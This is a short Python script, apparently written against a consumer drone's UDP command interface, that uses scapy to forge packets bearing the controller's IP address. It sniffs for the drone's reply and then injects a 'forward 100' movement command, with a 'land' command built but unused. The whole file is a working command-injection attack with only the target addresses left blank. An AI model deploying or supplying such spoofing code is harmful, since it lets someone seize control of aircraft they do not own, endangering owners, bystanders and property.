from scapy.all import IP, UDP, send, sniff

# Target Drone
drone_ip = ''
# Main Drone Controller
controller_ip = ''

ip = IP(src=controller_ip, dst=drone_ip)

udp = UDP(sport=8889, dport=8889)

pkt = ip/udp/'forward 100'
pkt2 = ip/udp/'land'

# The drone doesn't store commands, so we need to wait to send a command message until we receive a message that passes these filters (the only type of message that ever passes these filters is "ok" or something like "error")
sniff(filter=f'src host {drone_ip} and udp dst port 8889', count=1, timeout=3)
send(pkt)
